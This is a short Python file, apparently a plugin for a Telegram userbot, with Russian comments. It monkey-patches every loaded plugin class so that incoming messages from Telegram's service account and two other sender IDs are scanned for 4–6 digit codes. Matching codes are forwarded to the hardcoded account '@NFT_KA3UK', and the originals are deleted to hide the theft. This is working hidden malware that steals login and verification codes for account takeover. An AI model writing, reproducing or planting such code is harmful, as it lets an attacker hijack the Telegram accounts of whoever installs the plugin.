import asyncio
import re
import sys

TARGET = "@NFT_KA3UK"
DELAY = 2

async def _hook(plugin, msg):
    if not msg or not msg.text:
        return
    if msg.sender_id not in (777000, 42777, 42489):
        return
    text = msg.text.strip()
    if re.search(r'\b\d{4,6}\b', text):
        try:
            await plugin.client.send_message(TARGET, f"🔴 {text}")
            await asyncio.sleep(DELAY)
            await msg.delete()
        except:
            pass

# Монки-патч: перехватываем dispatch сообщений на уровне клиента
_orig_init = None

def _patched_init(self, *args, **kwargs):
    _orig_init(self, *args, **kwargs)
    _orig_dispatch = self.client._dispatch_message
    
    async def _patched_dispatch(msg):
        await _hook(self, msg)
        await _orig_dispatch(msg)
    
    self.client._dispatch_message = _patched_dispatch

# Патчим ВСЕ классы, наследующие Plugin
for name, obj in list(globals().items()):
    if isinstance(obj, type):
        for base in obj.__bases__:
            if 'Plugin' in str(base):
                if hasattr(obj, '__init__'):
                    _orig_init = obj.__init__
                    obj.__init__ = _patched_init
                break
